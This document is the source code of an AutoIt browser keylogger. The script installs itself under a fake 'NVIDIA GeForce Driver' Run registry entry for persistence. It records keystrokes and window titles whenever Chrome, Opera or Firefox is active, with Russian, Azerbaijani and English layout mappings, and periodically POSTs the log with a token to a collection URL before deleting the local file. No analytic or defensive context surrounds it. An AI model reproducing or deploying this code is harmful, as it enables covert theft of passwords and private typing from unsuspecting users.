#Include <File.au3>
#Include <WinAPIEx.au3>
#AutoIt3Wrapper_Compression 4
#NoTrayIcon

#Region Options
Global $file_name = _PathFull("038425936fc57444589709cc0229ddbe\", @AppDataDir) & "data"
Global $prev_tab_title = ""
Global $browsers[3];
Global $UserDll = DllOpen("user32.dll")
Global $url = "http://localhost/getmsg.php"
Global $file_max_size  = 0.1
Global $dest_path = _PathFull("MSDebuild\", @AppDataDir)

$browsers[0] = "Chrome_WidgetWin_1";
$browsers[1] = "OperaWindowClass";
$browsers[2] = "MozillaWindowClass";
#EndRegion

#Region Install keylogger
Func _IsFirstExec()
   If @ScriptFullPath <> _PathFull(@ScriptName, $dest_path) Then

	  If Not FileExists(_PathFull(@ScriptName, $dest_path)) Then
		 FileCopy(@ScriptFullPath, $dest_path, $FC_OVERWRITE + $FC_CREATEPATH)
	  EndIf

	  Local $regval = RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "NVIDIA GeForce Driver - "  & @ScriptName)
	  If $regval == "" Then
		 RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "NVIDIA GeForce Driver - "  & @ScriptName, "REG_SZ", $dest_path & @ScriptName)
	  EndIf

   EndIf
EndFunc
#EndRegion

#Region Check for key pressing
Func _IsPressed($hexKey)
   Local $aR, $bO
   $aR = DllCall($UserDll, "int", "GetAsyncKeyState", "int", $hexKey)
   If $aR[0] <> 0 Then
	   $bO = 1
   Else
	   $bO = 0
   EndIf

   Return $bO
EndFunc
#EndRegion

#Region Check for active browser
;This function check browsers and returns active one
Func _GetActiveBrowser()
   For $i = 0 To 2 Step 1
	  If (WinExists("[CLASS:" & $browsers[$i] & "]") And WinActive("[CLASS:" & $browsers[$i] & "]")) Then
		 ;MsgBox($MB_SYSTEMMODAL, "Browser active",$browsers[$i]);
		 Return $browsers[$i]
	  Else
		 Return 0
	  EndIf
   Next
EndFunc
#EndRegion

#Region Get keyboard language
Func _GetKeyboardLayout()
   Local $ruRU = 68748313
   Local $enEN = 67699721
   Local $azAZ = 69993516

   $hWnd = WinGetHandle("[ACTIVE]")

   If _WinAPI_GetKeyboardLayout($hWnd) = $ruRU Then
	  return "ru"
   ElseIf _WinAPI_GetKeyboardLayout($hWnd) = $enEN Then
	  return "en"
   ElseIf _WinAPI_GetKeyboardLayout($hWnd) = $azAZ Then
      return "az"
    EndIf
EndFunc
#EndRegion

#Region Log and send data
Func _SendData($fn)
   Local $data = ""
   Local $hfh = FileOpen($fn, $FO_READ)

   If $hfh <> -1 Then
	  $data = FileRead($hfh)
	  FileClose($hfh)
	  FileDelete($fn);
   Else
	  $data = "File is not opened, error occurs"
   EndIf

   $sPD = 'data=' & $data & '&token=522add0a88f8d8d9b3cb713bb566ab38'

   ; Creating the object
   $oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
   $oHTTP.Open("POST", $url, False)
   $oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")

   ; Performing the Request
   $oHTTP.Send($sPD)
EndFunc

Func _FileSize($filename)
   Local $iFileSize = Round(FileGetSize($filename)/1048576, '2')
   Return $iFileSize;
EndFunc

Func _LogKeyPress($what2log)
   If _FileSize($file_name) > $file_max_size Then
	  _SendData($file_name)
   EndIf

   Local $tab_title = WinGetTitle("[ACTIVE]")

   If $tab_title = $prev_tab_title Then
	  FileWrite($file_name,$what2log)
	  Sleep(100)
   Else
	  $prev_tab_title = $tab_title
	  FileWrite($file_name, "<br><b>["& @Year&"."&@mon&"."&@mday&"  "&@HOUR & ":" &@MIN & ":" &@SEC & ']  Window: "'& $tab_title & '" </b> : '& $what2log)
	  Sleep(100)
   EndIf
EndFunc
#EndRegion

#Region Main

While 1

   _IsFirstExec()

   $active_browser = _GetActiveBrowser()

   ;Create data file for keylogging
   if Not FileExists($file_name) Then
	  _FileCreate($file_name)
	  ;MsgBox(0, "Browser active",@error);
   EndIf

   If Not ($active_browser = "0") Then

		 $active_lang = _GetKeyboardLayout();

		 If _IsPressed(0xBB) = 1 Then _LogKeyPress('= ')
		 If _IsPressed(0xBD) = 1 Then _LogKeyPress('- ')
		 If _IsPressed(0xDC) = 1 Then _LogKeyPress('\ ')
		 If _IsPressed(0x08) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{BACKSPACE}</i></font> ')
		 If _IsPressed(0x09) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{TAB}</i></font> ')
		 If _IsPressed(0x0D) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{ENTER}</i></font> ')
		 If _IsPressed(0x13) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{PAUSE}</i></font> ')
		 If _IsPressed(0x14) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{CAPSLOCK}</i></font> ')
		 If _IsPressed(0x1B) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{ESC}</i></font> ')
		 If _IsPressed(0x20) = 1 Then _LogKeyPress(' ')
		 If _IsPressed(0x21) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{PAGE UP}</i></font> ')
		 If _IsPressed(0x22) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{PAGE DOWN}</i></font> ')
		 If _IsPressed(0x23) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{END}</i></font> ')
		 If _IsPressed(0x24) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{HOME}</i></font> ')
		 If _IsPressed(0x25) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{LEFT ARROW}</i></font> ')
		 If _IsPressed(0x26) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{UP ARROW}</i></font> ')
		 If _IsPressed(0x27) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{RIGHT ARROW}</i></font> ')
		 If _IsPressed(0x28) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{DOWN ARROW}</i></font> ')
		 If _IsPressed(0x2C) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{PRINT SCREEN}</i></font> ')
		 If _IsPressed(0x2D) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{INS}</i></font> ')
		 If _IsPressed(0x2E) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{DEL}</i></font> ')
		 If _IsPressed(0x5B) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{LEFT WIN}</i></font> ')
		 If _IsPressed(0x5C) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{RIGHT WIN}</i></font> ')
		 If _IsPressed(0x60) = 1 Then _LogKeyPress('Num 0')
		 If _IsPressed(0x61) = 1 Then _LogKeyPress('Num 1')
		 If _IsPressed(0x62) = 1 Then _LogKeyPress('Num 2')
		 If _IsPressed(0x63) = 1 Then _LogKeyPress('Num 3')
		 If _IsPressed(0x64) = 1 Then _LogKeyPress('Num 4')
		 If _IsPressed(0x65) = 1 Then _LogKeyPress('Num 5')
		 If _IsPressed(0x66) = 1 Then _LogKeyPress('Num 6')
		 If _IsPressed(0x67) = 1 Then _LogKeyPress('Num 7')
		 If _IsPressed(0x68) = 1 Then _LogKeyPress('Num 8')
		 If _IsPressed(0x69) = 1 Then _LogKeyPress('Num 9')
		 If _IsPressed(0x6A) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{MULTIPLY}</i></font> ')
		 If _IsPressed(0x6B) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{ADD}</i></font> ')
		 If _IsPressed(0x6C) = 1 Then _LogKeyPress('Separator')
		 If _IsPressed(0x6D) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{SUBTRACT}</i></font> ')
		 If _IsPressed(0x6E) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{DECIMAL}</i></font> ')
		 If _IsPressed(0x6F) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{DIVIDE}</i></font> ')
		 If _IsPressed(0x70) = 1 Then _LogKeyPress('F1 ')
		 If _IsPressed(0x71) = 1 Then _LogKeyPress('F2 ')
		 If _IsPressed(0x72) = 1 Then _LogKeyPress('F3 ')
		 If _IsPressed(0x73) = 1 Then _LogKeyPress('F4 ')
		 If _IsPressed(0x74) = 1 Then _LogKeyPress('F5 ')
		 If _IsPressed(0x75) = 1 Then _LogKeyPress('F6 ')
		 If _IsPressed(0x76) = 1 Then _LogKeyPress('F7 ')
		 If _IsPressed(0x77) = 1 Then _LogKeyPress('F8 ')
		 If _IsPressed(0x78) = 1 Then _LogKeyPress('F9 ')
		 If _IsPressed(0x79) = 1 Then _LogKeyPress('F10 ')
		 If _IsPressed(0x77) = 1 Then _LogKeyPress('F8 ')
		 If _IsPressed(0x78) = 1 Then _LogKeyPress('F9 ')
		 If _IsPressed(0x79) = 1 Then _LogKeyPress('F10 ')
		 If _IsPressed(0x7A) = 1 Then _LogKeyPress('F11 ')
		 If _IsPressed(0x7B) = 1 Then _LogKeyPress('F12 ')
		 If _IsPressed(0x90) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{NUM LOCK}</i></font> ')
		 If _IsPressed(0x91) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{SCROLL LOCK}</i></font> ')
		 If _IsPressed(0xA0) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{LEFT SHIFT}</i></font> ')
		 If _IsPressed(0xA1) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{RIGHT SHIFT}</i></font> ')
		 If _IsPressed(0xA2) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{LEFT CTRL}</i></font> ')
		 If _IsPressed(0xA3) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{RIGHT CTRL}</i></font> ')
		 If _IsPressed(0xA4) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{LEFT ALT}</i></font> ')
		 If _IsPressed(0xA5) = 1 Then _LogKeyPress('<font color=#008000 style=font-size:9px><i>{RIGHT ALT}</i></font> ')
		 If _IsPressed(0x30) = 1 Then _LogKeyPress('0')
		 If _IsPressed(0x31) = 1 Then _LogKeyPress('1')
		 If _IsPressed(0x32) = 1 Then _LogKeyPress('2')
		 If _IsPressed(0x33) = 1 Then _LogKeyPress('3')
		 If _IsPressed(0x34) = 1 Then _LogKeyPress('4')
		 If _IsPressed(0x35) = 1 Then _LogKeyPress('5')
		 If _IsPressed(0x36) = 1 Then _LogKeyPress('6')
		 If _IsPressed(0x37) = 1 Then _LogKeyPress('7')
		 If _IsPressed(0x38) = 1 Then _LogKeyPress('8')
		 If _IsPressed(0x39) = 1 Then _LogKeyPress('9')

	  If $active_lang = "ru" Then
		 If _IsPressed(0x41) = 1 Then _LogKeyPress('ф')
		 If _IsPressed(0x42) = 1 Then _LogKeyPress('и')
		 If _IsPressed(0x43) = 1 Then _LogKeyPress('с')
		 If _IsPressed(0x44) = 1 Then _LogKeyPress('в')
		 If _IsPressed(0x45) = 1 Then _LogKeyPress('у')
		 If _IsPressed(0x46) = 1 Then _LogKeyPress('а')
		 If _IsPressed(0x47) = 1 Then _LogKeyPress('п')
		 If _IsPressed(0x48) = 1 Then _LogKeyPress('р')
		 If _IsPressed(0x49) = 1 Then _LogKeyPress('ш')
		 If _IsPressed(0x4A) = 1 Then _LogKeyPress('о')
		 If _IsPressed(0x4B) = 1 Then _LogKeyPress('л')
		 If _IsPressed(0x4C) = 1 Then _LogKeyPress('д')
		 If _IsPressed(0x4D) = 1 Then _LogKeyPress('ь')
		 If _IsPressed(0x4E) = 1 Then _LogKeyPress('т')
		 If _IsPressed(0x4F) = 1 Then _LogKeyPress('щ')
		 If _IsPressed(0x50) = 1 Then _LogKeyPress('з')
		 If _IsPressed(0x51) = 1 Then _LogKeyPress('й')
		 If _IsPressed(0x52) = 1 Then _LogKeyPress('к')
		 If _IsPressed(0x53) = 1 Then _LogKeyPress('ы')
		 If _IsPressed(0x54) = 1 Then _LogKeyPress('е')
		 If _IsPressed(0x55) = 1 Then _LogKeyPress('г')
		 If _IsPressed(0x56) = 1 Then _LogKeyPress('м')
		 If _IsPressed(0x57) = 1 Then _LogKeyPress('ц')
		 If _IsPressed(0x58) = 1 Then _LogKeyPress('ч')
		 If _IsPressed(0x59) = 1 Then _LogKeyPress('н')
		 If _IsPressed(0x5A) = 1 Then _LogKeyPress('я')
		 If _IsPressed(0xBE) = 1 Then _LogKeyPress('ю')
		 If _IsPressed(0xBA) = 1 Then _LogKeyPress('ж')
		 If _IsPressed(0xDE) = 1 Then _LogKeyPress("э")
		 If _IsPressed(0xDB) = 1 Then _LogKeyPress('х')
		 If _IsPressed(0xDD) = 1 Then _LogKeyPress('ъ')
		 If _IsPressed(0xBC) = 1 Then _LogKeyPress('б')
		 If _IsPressed(0xBF) = 1 Then _LogKeyPress('. ')
		 If _IsPressed(0xC0) = 1 Then _LogKeyPress('` ')
	  ElseIf $active_lang = "az" Then
		 If _IsPressed(0x41) = 1 Then _LogKeyPress('a')
		 If _IsPressed(0x42) = 1 Then _LogKeyPress('b')
		 If _IsPressed(0x43) = 1 Then _LogKeyPress('c')
		 If _IsPressed(0x44) = 1 Then _LogKeyPress('d')
		 If _IsPressed(0x45) = 1 Then _LogKeyPress('e')
		 If _IsPressed(0x46) = 1 Then _LogKeyPress('f')
		 If _IsPressed(0x47) = 1 Then _LogKeyPress('g')
		 If _IsPressed(0x48) = 1 Then _LogKeyPress('h')
		 If _IsPressed(0x49) = 1 Then _LogKeyPress('i')
		 If _IsPressed(0x4A) = 1 Then _LogKeyPress('j')
		 If _IsPressed(0x4B) = 1 Then _LogKeyPress('k')
		 If _IsPressed(0x4C) = 1 Then _LogKeyPress('l')
		 If _IsPressed(0x4D) = 1 Then _LogKeyPress('m')
		 If _IsPressed(0x4E) = 1 Then _LogKeyPress('n')
		 If _IsPressed(0x4F) = 1 Then _LogKeyPress('o')
		 If _IsPressed(0x50) = 1 Then _LogKeyPress('p')
		 If _IsPressed(0x51) = 1 Then _LogKeyPress('q')
		 If _IsPressed(0x52) = 1 Then _LogKeyPress('r')
		 If _IsPressed(0x53) = 1 Then _LogKeyPress('s')
		 If _IsPressed(0x54) = 1 Then _LogKeyPress('t')
		 If _IsPressed(0x55) = 1 Then _LogKeyPress('u')
		 If _IsPressed(0x56) = 1 Then _LogKeyPress('v')
		 If _IsPressed(0x57) = 1 Then _LogKeyPress('ü')
		 If _IsPressed(0x58) = 1 Then _LogKeyPress('x')
		 If _IsPressed(0x59) = 1 Then _LogKeyPress('y')
		 If _IsPressed(0x5A) = 1 Then _LogKeyPress('z')
		 If _IsPressed(0xBE) = 1 Then _LogKeyPress('ş')
		 If _IsPressed(0xBA) = 1 Then _LogKeyPress('ı')
		 If _IsPressed(0xDE) = 1 Then _LogKeyPress("ə")
		 If _IsPressed(0xDB) = 1 Then _LogKeyPress('ö')
		 If _IsPressed(0xDD) = 1 Then _LogKeyPress('ğ')
		 If _IsPressed(0xBC) = 1 Then _LogKeyPress('ç')
		 If _IsPressed(0xBF) = 1 Then _LogKeyPress('. ')
		 If _IsPressed(0xC0) = 1 Then _LogKeyPress('ə')
	  Else
		 If _IsPressed(0x41) = 1 Then _LogKeyPress('a')
		 If _IsPressed(0x42) = 1 Then _LogKeyPress('b')
		 If _IsPressed(0x43) = 1 Then _LogKeyPress('c')
		 If _IsPressed(0x44) = 1 Then _LogKeyPress('d')
		 If _IsPressed(0x45) = 1 Then _LogKeyPress('e')
		 If _IsPressed(0x46) = 1 Then _LogKeyPress('f')
		 If _IsPressed(0x47) = 1 Then _LogKeyPress('g')
		 If _IsPressed(0x48) = 1 Then _LogKeyPress('h')
		 If _IsPressed(0x49) = 1 Then _LogKeyPress('i')
		 If _IsPressed(0x4A) = 1 Then _LogKeyPress('j')
		 If _IsPressed(0x4B) = 1 Then _LogKeyPress('k')
		 If _IsPressed(0x4C) = 1 Then _LogKeyPress('l')
		 If _IsPressed(0x4D) = 1 Then _LogKeyPress('m')
		 If _IsPressed(0x4E) = 1 Then _LogKeyPress('n')
		 If _IsPressed(0x4F) = 1 Then _LogKeyPress('o')
		 If _IsPressed(0x50) = 1 Then _LogKeyPress('p')
		 If _IsPressed(0x51) = 1 Then _LogKeyPress('q')
		 If _IsPressed(0x52) = 1 Then _LogKeyPress('r')
		 If _IsPressed(0x53) = 1 Then _LogKeyPress('s')
		 If _IsPressed(0x54) = 1 Then _LogKeyPress('t')
		 If _IsPressed(0x55) = 1 Then _LogKeyPress('u')
		 If _IsPressed(0x56) = 1 Then _LogKeyPress('v')
		 If _IsPressed(0x57) = 1 Then _LogKeyPress('w')
		 If _IsPressed(0x58) = 1 Then _LogKeyPress('x')
		 If _IsPressed(0x59) = 1 Then _LogKeyPress('y')
		 If _IsPressed(0x5A) = 1 Then _LogKeyPress('z')
		 If _IsPressed(0xBE) = 1 Then _LogKeyPress('. ')
		 If _IsPressed(0xBA) = 1 Then _LogKeyPress('; ')
		 If _IsPressed(0xDE) = 1 Then _LogKeyPress("' ")
		 If _IsPressed(0xDB) = 1 Then _LogKeyPress('[ ')
		 If _IsPressed(0xDD) = 1 Then _LogKeyPress('] ')
		 If _IsPressed(0xBC) = 1 Then _LogKeyPress(', ')
		 If _IsPressed(0xBF) = 1 Then _LogKeyPress('/ ')
		 If _IsPressed(0xC0) = 1 Then _LogKeyPress('` ')
	  EndIf
	  sleep(100)
   EndIf
WEnd
#EndRegion
